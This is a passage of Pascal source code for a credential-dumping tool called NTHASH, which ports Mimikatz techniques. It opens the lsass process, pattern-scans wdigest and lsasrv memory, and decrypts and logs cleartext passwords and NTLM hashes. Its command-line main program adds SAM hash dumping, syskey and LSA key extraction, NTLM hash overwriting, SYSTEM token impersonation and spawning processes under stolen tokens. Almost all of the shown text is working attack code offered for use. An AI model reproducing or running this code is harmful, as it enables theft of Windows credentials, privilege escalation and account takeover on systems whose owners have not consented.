                                       setlength(password,PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length);
                                       ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),password );
                                       setlength(decrypted,1024);
                                       if decryptLSA (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,password,decrypted)=false
                                                     then log('decryptLSA NOT OK')
                                                     else
                                                       begin
                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=7 then
                                                          begin
                                                          log('->Primary',1);
                                                          //log('domainoff:'+inttostr(PCRED_NTLM_BLOCK(@decrypted[0]).domainoff)) ;
                                                          //log('usernameoff:'+inttostr(PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff)) ;
                                                          log('domain:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).domainoff]),1);
                                                          log('username:'+pwidechar(@decrypted[PCRED_NTLM_BLOCK(@decrypted[0]).usernameoff]),1);
                                                          log('ntlm:'+ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
                                                          end;
                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14 then
                                                          begin
                                                          log('->CredentialKeys',1);
                                                          log('ntlm:'+ByteToHexaString(Pcredentialkeys(@decrypted[0]).ntlmhash) ,1);
                                                          end;
                                                       end;
                                       end;//if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
                                     if credentials=0 then break;
                                     ReadMem  (hprocess,credentials,bytes );
                                     end; //while nativeuint(PKIWI_MSV1_0_CREDENTIALS(@bytes[0]).next)<>0 do
                                     end;//if nativeuint(_KIWI_MSV1_0_LIST_63 (logsesslist ).Credentials)<>0 then
                                   //next logsesslist
                                   ReadMem  (hprocess,_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,logsesslist );
                                   dummy:=inttohex(_KIWI_MSV1_0_LIST_63 (logsesslist ).flink,sizeof(pointer));
                                   end;
                                   //...

                                   end; //if readmem
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;



//check kuhl_m_sekurlsa_utils.c
function wdigest(pid:dword;module:string):boolean;
const
  //dd Lsasrv!LogonSessionList in windbg
  WN1703_LogonSessionList:array [0..11] of byte= ($33, $ff, $45, $89, $37, $48, $8b, $f3, $45, $85, $c9, $74);
  WNBLUE_LogonSessionList:array [0..12] of byte=($8b, $de, $48, $8d, $0c, $5b, $48, $c1, $e1, $05, $48, $8d, $05);
  after:array[0..1] of byte=($eb,$04);
  //after:array[0..1] of byte=($0F,$84);
  // Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
  //dd wdigest!l_LogSessList in windbg
  PTRN_WIN5_PasswdSet:array [0..3] of byte=  ($48, $3b, $da, $74);
  PTRN_WIN6_PasswdSet:array [0..3] of byte=  ($48, $3b, $d9, $74);
  //x86
  PTRN_WIN5_PasswdSet_X86:array    [0..6] of byte= ($74, $18, $8b, $4d, $08, $8b, $11);
  PTRN_WIN6_PasswdSet_X86:array    [0..6] of byte= ($74, $11, $8b, $0b, $39, $4e, $10);
  PTRN_WIN63_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0a, $39, $4e, $10);
  PTRN_WIN64_PasswdSet_X86:array   [0..6] of byte= ($74, $15, $8b, $0f, $39, $4e, $10);
  PTRN_WIN1809_PasswdSet_X86:array [0..6] of byte= ($74, $15, $8b, $17, $39, $56, $10);
var
  dummy:string;
  hprocess,hmod:thandle;
  hmods:array[0..1023] of thandle;
  MODINFO:  MODULEINFO;
  cbNeeded,count:	 DWORD;
  szModName:array[0..254] of char;
  addr:pointer;
  offset_list:array[0..3] of byte;
  offset_list_dword:dword;
  read:cardinal;
  offset:nativeint=0;
  patch_pos:ShortInt=0;
  pattern:array of byte;
  logsesslist:array [0..sizeof(i_logsesslist)-1] of byte;
  bytes:array[0..254] of byte;
  password,decrypted:tbytes;
  username,domain:array [0..254] of widechar;
begin
  if pid=0 then exit;
  //if user='' then exit;
  //
  if (lowercase(osarch)='amd64') then
     begin
     if copy(winver,1,2)='5' then
        begin
        setlength(pattern,sizeof(PTRN_WIN5_PasswdSet));
        copymemory(@pattern[0],@PTRN_WIN5_PasswdSet[0],sizeof(PTRN_WIN5_PasswdSet));
        end
        else
        begin
        setlength(pattern,sizeof(PTRN_WIN6_PasswdSet));
        copymemory(@pattern[0],@PTRN_WIN6_PasswdSet[0],sizeof(PTRN_WIN6_PasswdSet));
        end;
     //{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_WN1703_LogonSessionList),	PTRN_WN1703_LogonSessionList},	{0, NULL}, {23,  -4}}
     patch_pos:=23;
     //{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN63_LogonSessionList),	PTRN_WN63_LogonSessionList},	{0, NULL}, {36,  -6}},
     patch_pos:=36;
     //{KULL_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
     //{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
     //{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
     patch_pos:=-4;
     end;
  if (lowercase(osarch)='x86') then
     begin
        setlength(pattern,7);
          if copy(winver,1,3)='5.1' then copymemory(@pattern[0],@PTRN_WIN5_PasswdSet_X86[0],7);
          //vista - 6.0
          if (copy(winver,1,3)='6.0')
             or (copy(winver,1,3)='6.1')
             or (copy(winver,1,3)='6.2') then copymemory(@pattern[0],@PTRN_WIN6_PasswdSet_X86[0],7);
          //win 8.1 6.3
          if copy(winver,1,3)='6.3' then copymemory(@pattern[0],@PTRN_WIN63_PasswdSet_X86[0],7);
          //generic for now
          patch_pos:=-6;
     end;

  if patch_pos =0 then
     begin
     log('no patch mod for this windows version',1);
     exit;
     end;
  log('patch pos:'+inttostr(patch_pos ),0);
  //
  hprocess:=thandle(-1);
  hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
                                        false,pid);
  if hprocess<>thandle(-1) then
       begin
       log('openprocess ok',0);
       //log(inttohex(GetModuleHandle (nil),sizeof(nativeint)));
       cbneeded:=0;
       if EnumProcessModules(hprocess, @hMods, SizeOf(hmodule)*1024, cbNeeded) then
               begin
               log('EnumProcessModules OK',0);

               for count:=0 to cbneeded div sizeof(thandle) do
                   begin
                    if GetModuleFileNameExA( hProcess, hMods[count], szModName,sizeof(szModName) )>0 then
                      begin
                      dummy:=lowercase(strpas(szModName ));
                      if pos(lowercase(module),dummy)>0 then
                         begin
                         log(module+' found:'+inttohex(hMods[count],8),0);
                         if GetModuleInformation (hprocess,hMods[count],MODINFO ,sizeof(MODULEINFO)) then
                            begin
                            log('lpBaseOfDll:'+inttohex(nativeint(MODINFO.lpBaseOfDll),sizeof(pointer)),0 );
                            log('SizeOfImage:'+inttostr(MODINFO.SizeOfImage),0);
                            addr:=MODINFO.lpBaseOfDll;
                            //offset:=search(hprocess,addr,MODINFO.SizeOfImage);
                            log('Searching...',0);
                            offset:=searchmem(hprocess,addr,MODINFO.SizeOfImage,pattern);
                            log('Done!',0);
                            if offset<>0 then
                                 begin
                                 log('found:'+inttohex(offset,sizeof(pointer)),0);
                                 //
                                 if ReadMem  (hprocess,offset+patch_pos,offset_list) then
                                   begin
                                   CopyMemory(@offset_list_dword,@offset_list[0],4);
                                   log('ReadProcessMemory OK '+inttohex(offset_list_dword{$ifdef CPU64}+4{$endif CPU64},4));
                                   //we now should get a match with .load lsrsrv.dll then dd Lsasrv!LogonSessionList
                                   //new offset to the list entry
                                   {$ifdef CPU64}
                                   offset:= offset+offset_list_dword+4+patch_pos;
                                   {$endif CPU64}
                                   {$ifdef CPU32}
                                   offset:= offset_list_dword{+patch_pos};
                                   {$endif CPU32}
                                   log('offset:'+leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0'),0);
                                   //read sesslist at offset
                                   ReadMem  (hprocess,offset,logsesslist );
                                   dummy:=inttohex(i_logsesslist (logsesslist ).next,sizeof(pointer));
                                   //lets skip the first one
                                   ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
                                   //lets loop
                                   //while dummy<>leftpad(inttohex(offset,sizeof(pointer)),sizeof(pointer) * 2,'0') do
                                   //while dummy<>inttohex(offset,sizeof(pointer)) do
                                   while i_logsesslist (logsesslist).next<>offset do
                                   begin
                                   log('entry#this:'+inttohex(i_logsesslist (logsesslist ).this ,sizeof(pointer)),0) ;
                                   log('entry#next:'+dummy,0) ;
                                   log('usagecount:'+inttostr(i_logsesslist (logsesslist ).usagecount),1) ;
                                   //get username
                                   ReadMem  (hprocess,i_logsesslist (logsesslist ).usernameptr,bytes );
                                   copymemory(@username[0],@bytes[0],64);
                                   log('username:'+widestring(username),1);
                                   //get domain
                                   ReadMem  (hprocess,i_logsesslist (logsesslist ).domainptr,bytes );
                                   copymemory(@domain[0],@bytes[0],64);
                                   log('domain:'+widestring(domain),1);
                                   //
                                   log('pwdlen:'+inttostr(i_logsesslist (logsesslist ).maxlen3),1) ;
                                   if (i_logsesslist (logsesslist ).maxlen3>0) and (i_logsesslist (logsesslist ).usagecount>0) then
                                     begin
                                     setlength(password,i_logsesslist (logsesslist ).maxlen3);
                                     ReadMem  (hprocess,i_logsesslist (logsesslist ).passwordptr ,@password[0],i_logsesslist (logsesslist ).maxlen3 );
                                     setlength(decrypted,1024);
                                     if decryptLSA (i_logsesslist (logsesslist ).maxlen3,password,decrypted)=true
                                        then log(strpas (pwidechar(@decrypted[0]) ),1);
                                     end;
                                   //decryptcreds;
                                   //next
                                   ReadMem  (hprocess,i_logsesslist (logsesslist).next,logsesslist );
                                   dummy:=inttohex(i_logsesslist (logsesslist).next,sizeof(pointer));
                                   end;
                                   //...

                                   end; //if readmem
                                 end;
                            {//test - lets read first 4 bytes of our module
                             //can be verified with process hacker
                            if ReadProcessMemory( hprocess,addr,@buffer[0],4,@read) then
                               begin
                               log('ReadProcessMemory OK');
                               log(inttohex(buffer[0],1)+inttohex(buffer[1],1)+inttohex(buffer[2],1)+inttohex(buffer[3],1));
                               end;
                            }
                            end;//if GetModuleInformation...
                         end; //if pos('samsrv.dll',dummy)>0 then
                      end; //if GetModuleFileNameExA
                   end; //for count:=0...
               end; //if EnumProcessModules...
       closehandle(hprocess);
       end;//if openprocess...

end;

function impersonatepid(pid:dword):boolean;
var
  i:byte;
begin
result:=false;
for i:=3 downto 0 do
  begin
  if ImpersonateAsSystemW_Vista (TIntegrityLevel(i),pid) then begin result:=true;exit;end;
  end;
log('impersonatepid NOT OK',1);
end;

function createprocessaspid(ApplicationName: string;pid:string     ):boolean;
var
  StartupInfo: TStartupInfoW;
  ProcessInformation: TProcessInformation;
  i:byte;
begin
ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
  FillChar(StartupInfo, SizeOf(TStartupInfoW), 0);
  StartupInfo.cb := SizeOf(TStartupInfoW);
  StartupInfo.lpDesktop := 'WinSta0\Default';
  for i:=3 downto 0 do
    begin
    result:= CreateProcessAsSystemW_Vista(PWideChar(WideString(ApplicationName)),PWideChar(WideString('')),NORMAL_PRIORITY_CLASS,
    nil,pwidechar(widestring(GetCurrentDir)),
    StartupInfo,ProcessInformation,
    TIntegrityLevel(i),
    strtoint(pid ));
    if result then break;
    end;
end;

function callback_SamUsers(param:pointer=nil):dword;stdcall;
var
  bytes:tbyte16;
  username:string;
begin
  try
  fillchar(bytes,sizeof(bytes),0);
  if dumphash(psamuser(param).samkey,psamuser(param).rid,bytes,username)
          then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1)
          else log('gethash NOT OK for '+inttohex(psamuser(param).rid,8)+':'+username ,1);
  except
    on e:exception do
    begin
      if e.ClassName ='EAccessViolation' then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1);
      log(e.Message ,0); //SHAME!!!!!!!!!!!!!!
    end;
  end;
end;



begin
  log('NTHASH 1.3 by erwan2212@gmail.com',1);
  winver:=GetWindowsVer;
  osarch:=getenv('PROCESSOR_ARCHITECTURE');
  log('Windows Version:'+winver,1);
  log('Architecture:'+osarch,1);
  log('Username:'+GetCurrUserName,1);
  log('DebugPrivilege:'+BoolToStr (EnableDebugPriv),1);
  lsass_pid:=_EnumProc('lsass.exe');
  log('LSASS PID:'+inttostr(lsass_pid ),1);
  getmem(sysdir,Max_Path );
  GetSystemDirectory(sysdir, MAX_PATH - 1);
  //
  if paramcount=0 then
  begin
  log('NTHASH /setntlm [/server:hostname] /user:username /newhash:xxx',1);
  log('NTHASH /setntlm [/server:hostname] /user:username /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newpwd:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldpwd:xxx /newhash:xxx',1);
  log('NTHASH /changentlm [/server:hostname] /user:username /oldhash:xxx /newhash:xxx',1);
  log('NTHASH /gethash /password:password',1);
  log('NTHASH /getsid /user:username [/server:hostname]',1);
  log('NTHASH /getusers [/server:hostname]',1);
  log('NTHASH /getdomains [/server:hostname]',1);
  log('NTHASH /dumpsam',1);
  log('NTHASH /dumphashes [/offline]',1);
  log('NTHASH /dumphash /rid:500 [/offline]',1);
  log('NTHASH /getsyskey [/offline]',1);
  log('NTHASH /getsamkey [/offline]',1);
  log('NTHASH /getlsakeys',1);
  log('NTHASH /wdigest',1);
  log('NTHASH /logonpasswords',1);
  log('NTHASH /enumcred',1);
  log('NTHASH /enumcred2',1);
  log('NTHASH /enumvault',1);
  log('NTHASH /cryptunprotectdata /input:filename',1);
  log('NTHASH /cryptprotectdata /input:string',1);
  log('NTHASH /runasuser /user:username /password:password [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runastoken /pid:12345 [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /runaschild /pid:12345 [/binary:x:\folder\bin.exe]',1);
  log('NTHASH /enumpriv',1);
  log('NTHASH /enumproc',1);
  log('NTHASH /killproc /pid:12345',1);
  log('NTHASH /enummod /pid:12345',1);
  log('NTHASH /dumpprocess /pid:12345',1);
  log('NTHASH /a_command /verbose',1);
  log('NTHASH /a_command /system',1);
  end;
  //
  p:=pos('/system',cmdline);
  if p>0 then
     begin
     if impersonatepid (lsass_pid) then log('Impersonate:'+GetCurrUserName,1);
     end;
  p:=pos('/verbose',cmdline);
  if p>0 then verbose:=true;
  p:=pos('/offline',cmdline);
  if p>0 then
     begin
     usamutils.offline :=true;
     log('Offline=true',1);
     if (not FileExists ('sam.sav')) or (not FileExists ('system.sav')) then
        begin
        log('sam.sav and/or system.sav missing',1);
        exit;
        end;
     end;
  //
  //enum_samusers(samkey);
  {
  password:='Password2212';
  setlength(buffer,length(password));
  Move(password[1], buffer[0], Length(password));
  if CryptProtectData_ (buffer,'test.bin')=false then writeln('false');
  if CryptUnProtectData_(buffer,'test.bin')=false
     then writeln('false')
     else writeln(BytetoAnsiString (buffer));
  //writeln(BytetoAnsiString (buffer)+'.');
  }
  //exit;
  //
  p:=pos('/enumcred2',cmdline);
if p>0 then
   begin
   uvaults.VaultInit ;
   uvaults.patch (lsass_pid ); //calling enumvault seems to bring back an encrypted blob
   exit;
   end;
    p:=pos('/enumvault',cmdline);
  if p>0 then
     begin
     uvaults.VaultInit ;
     uvaults.Vaultenum ;
     end;
  p:=pos('/enumcred',cmdline);
  if p>0 then
     begin
       try
       if CredEnum=true then log('enumcred OK',1) else log('enumcred NOT OK',1);
       except
       on e:exception do log(e.message);
       end;
     end;
  p:=pos('/getlsakeys',cmdline);
  if p>0 then
     begin
     if findlsakeys (lsass_pid,deskey,aeskey,iv ) then
        begin
        log('IV:'+ByteToHexaString (iv),1);
        log('DESKey:'+ByteToHexaString (deskey),1);
        log('AESKey:'+ByteToHexaString (aeskey),1);
        end;
     exit;
     end;
  p:=pos('/logonpasswords',cmdline);
  if p>0 then
     begin
     findlsakeys (lsass_pid,deskey,aeskey,iv );
     logonpasswords (lsass_pid,'lsasrv.dll');
     end;
  p:=pos('/wdigest',cmdline);
  if p>0 then
     begin
     if findlsakeys (lsass_pid,deskey,aeskey,iv )=true
        then wdigest (lsass_pid,'wdigest.dll')
        else log('findlsakeys failed',1);
     exit;
     end;
  p:=pos('/enumpriv',cmdline);
  if p>0 then
     begin
     if enumprivileges=false then writeln('enumprivileges NOT OK');
     exit;
     end;
  p:=pos('/pid:',cmdline);
  if p>0 then
       begin
       pid:=copy(cmdline,p,255);
       pid:=stringreplace(pid,'/pid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(pid,pos(' ',pid),255);
       end;
  p:=pos('/rid:',cmdline);
  if p>0 then
       begin
       rid:=copy(cmdline,p,255);
       rid:=stringreplace(rid,'/rid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(rid,pos(' ',rid),255);
       end;
  p:=pos('/binary:',cmdline);
  if p>0 then
       begin
       binary:=copy(cmdline,p,255);
       binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
       delete(binary,pos(' ',binary),255);
       end;
  p:=pos('/input:',cmdline);
  if p>0 then
       begin
       input:=copy(cmdline,p,255);
       input:=stringreplace(input,'/input:','',[rfReplaceAll, rfIgnoreCase]);
       delete(input,pos(' ',input),255);
       end;
  p:=pos('/bytetostring',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     log('BytetoString:'+BytetoAnsiString (HexaStringToByte (input)),1);
     end;
  p:=pos('/stringtobyte',cmdline);
  if p>0 then
     begin
     if input='' then exit;
     log('StringtoByte:'+ ByteToHexaString ( AnsiStringtoByte(input)),1);
     end;
  p:=pos('/getsyskey',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey)
        then log('Syskey:'+ByteToHexaString(syskey) ,1)
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/getsamkey',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then log('SAMKey:'+ByteToHexaString(samkey) ,1)
           else log('getsamkey NOT OK' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/dumphashes',cmdline);
  if p>0 then
     begin
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then
              begin
              log('SAMKey:'+ByteToHexaString(samkey) ,1);
              query_samusers (samkey,@callback_SamUsers );
              end //if getsamkey(syskey,samkey)
           else log('getsamkey NOT OK' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/dumphash',cmdline);
  if p>0 then
     begin
     if rid='' then exit;
     if getsyskey(syskey) then
        begin
        log('SYSKey:'+ByteToHexaString(SYSKey) ,1);
        if getsamkey(syskey,samkey)
           then
              begin
              log('SAMKey:'+ByteToHexaString(samkey) ,1);
              if dumphash(samkey,strtoint(rid),ntlmhash,user)
                 then log('NTHASH:'+user+':'+rid+'::'+ByteToHexaString(ntlmhash) ,1)
                 else log('gethash NOT OK' ,1);
              end //if getsamkey(syskey,samkey)
           else log('getsamkey NOT OK' ,1);
        end //if getsyskey(syskey) then
        else log('getsyskey NOT OK' ,1);
     exit;
     end;
  p:=pos('/enumproc',cmdline);
    if p>0 then
       begin
       _EnumProc ;
       exit;
       end;
    p:=pos('/enummod',cmdline);
    if p>0 then
       begin
       if pid='' then exit;
       _EnumMod(strtoint(pid),'');
       exit;
       end;
  p:=pos('/dumpprocess',cmdline);
  if p>0 then
     begin
     if pid='' then exit;
     if dumpprocess (strtoint(pid)) then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/killproc',cmdline);
  if p>0 then
     begin
     if pid='' then exit;
     if _killproc(strtoint(pid)) then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/dumpsam',cmdline);
  if p>0 then
     begin
     if dumpsam (lsass_pid ,'') then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/server:',cmdline);
  if p>0 then
       begin
       server:=copy(cmdline,p,255);
       server:=stringreplace(server,'/server:','',[rfReplaceAll, rfIgnoreCase]);
       delete(server,pos(' ',server),255);
       //log(server);
       end;
  p:=pos('/user:',cmdline);
    if p>0 then
         begin
         user:=copy(cmdline,p,255);
         user:=stringreplace(user,'/user:','',[rfReplaceAll, rfIgnoreCase]);
         delete(user,pos(' ',user),255);
         //log(user);
         end;
    p:=pos('/password:',cmdline);
      if p>0 then
           begin
           password:=copy(cmdline,p,255);
           password:=stringreplace(password,'/password:','',[rfReplaceAll, rfIgnoreCase]);
           delete(user,pos(' ',password),255);
           //log(user);
           end;
    p:=pos('/gethash',cmdline);
      if p>0 then
           begin
           if password='' then exit;
           log (GenerateNTLMHash (password),1);
           exit;
           end;
  p:=pos('/getusers',cmdline);
  if p>0 then
       begin
       QueryUsers (pchar(server),'',nil );
       exit;
       end;
  p:=pos('/getdomains',cmdline);
  if p>0 then
       begin
       QueryDomains (pchar(server),nil );
       exit;
       end;
  p:=pos('/getsid',cmdline);
  if p>0 then
       begin
       GetAccountSid2(widestring(server),widestring(user),mypsid);
       ConvertSidToStringSidA (mypsid,mystringsid);
       log(mystringsid,1);
       exit;
       end;
  p:=pos('/oldhash:',cmdline);
  if p>0 then
       begin
       oldhash:=copy(cmdline,p,255);
       oldhash:=stringreplace(oldhash,'/oldhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldhash,pos(' ',oldhash),255);
       //log(oldhash);
       end;
  p:=pos('/newhash:',cmdline);
  if p>0 then
       begin
       newhash:=copy(cmdline,p,255);
       newhash:=stringreplace(newhash,'/newhash:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newhash,pos(' ',newhash),255);
       //log(newhash);
       end;
  p:=pos('/oldpwd:',cmdline);
  if p>0 then
       begin
       oldpwd:=copy(cmdline,p,255);
       oldpwd:=stringreplace(oldpwd,'/oldpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(oldpwd,pos(' ',oldpwd),255);
       //log(oldpwd);
       end;
  p:=pos('/newpwd:',cmdline);
  if p>0 then
       begin
       newpwd:=copy(cmdline,p,255);
       newpwd:=stringreplace(newpwd,'/newpwd:','',[rfReplaceAll, rfIgnoreCase]);
       delete(newpwd,pos(' ',newpwd),255);
       //log(newpwd);
       end;
  p:=pos('/setntlm',cmdline);
  if p>0 then
       begin
       if newhash<>'' then newhashbyte :=HexaStringToByte (newhash);
       if newpwd<>'' then newhash:=GenerateNTLMHash (newpwd);
       if SetInfoUser (server,user, HexaStringToByte (newhash))
          then log('Done',1)
          else log('Failed',1);
       end;
  p:=pos('/changentlm',cmdline);
  if p>0 then
       begin
       if oldpwd<>'' then oldhashbyte:=tbyte16(GenerateNTLMHashByte (oldpwd));
       if newpwd<>'' then newhashbyte:=tbyte16(GenerateNTLMHashByte (newpwd));
       if oldhash<>'' then oldhashbyte :=HexaStringToByte (oldhash);
       if newhash<>'' then newhashbyte :=HexaStringToByte (newhash);
       if ChangeNTLM(server,user,oldhashbyte ,newhashbyte)
          then log('Done',1)
          else log('Failed',1);
       end;
  p:=pos('/runastoken',cmdline);
  if p>0 then
     begin
     if copy(winver,1,3)='5.1' then exit;
     if pid='' then exit;
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if createprocessaspid   (binary,pid)
        then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/runasuser',cmdline);
  if p>0 then
     begin
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if CreateProcessAsLogon (user,password,binary,'')=0
        then log('Done',1)
        else log('Failed',1);
     //WriteLn(Impersonate('l4mpje','Password123')) ;
     //writeln(GetLastError );
     //WriteLn (GetCurrUserName);
     //RevertToSelf ;
     //writeln(GetCurrUserName );
     end;
  p:=pos('/runaschild',cmdline);
  if p>0 then
     begin
     if copy(winver,1,3)='5.1' then exit;
     if pid='' then exit;
     if binary='' then binary:=sysdir+'\cmd.Exe';
     if CreateProcessOnParentProcess(strtoint(pid),binary)=true
        then log('OK',1) else log('NOT OK',1);
     exit;
     end;
  p:=pos('/cryptunprotectdata',cmdline);
  if p>0 then
     begin
     if input='' then exit;
      if CryptUnProtectData_(input,buffer)=false
         then log('CryptUnProtectData_ NOT OK',1)
         else log('Decrypted:'+BytetoAnsiString (buffer),1);
     end;
  p:=pos('/cryptprotectdata',cmdline);
  if p>0 then
     begin
     if input='' then exit;
      if CryptProtectData_(AnsiStringtoByte (input) ,'encrypted.blob')=false
         then log('CryptUnProtectData_ NOT OK',1)
         else log('CryptUnProtectData_ OK - written : encrypted.blob',1);
     end;

end.

